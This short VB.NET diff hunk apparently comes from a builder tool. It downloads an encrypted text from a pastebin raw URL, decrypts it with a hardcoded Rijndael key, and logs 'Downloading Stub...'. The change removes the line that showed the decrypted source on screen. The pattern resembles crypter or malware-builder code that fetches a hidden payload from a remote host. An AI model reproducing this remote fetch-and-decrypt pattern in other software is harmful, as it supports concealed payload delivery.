@@ -1600,7 +1600,7 @@ Jump:       MapView.Show()
             Dim source As String = New WebClient().DownloadString("http://pastebin.com/raw.php?i=NNJmzryK")
 
             Dim cleansource As String = New Encryption().RijndaelDecrypt(source, "J_s<eg1x_gF@1ie%EH4qC8?=:8[EnR")
-            RichTextBox2.Text = cleansource
+
 
             RichTextBox1.AppendText(Gettime() & "Downloading Stub..." & vbCrLf)
 
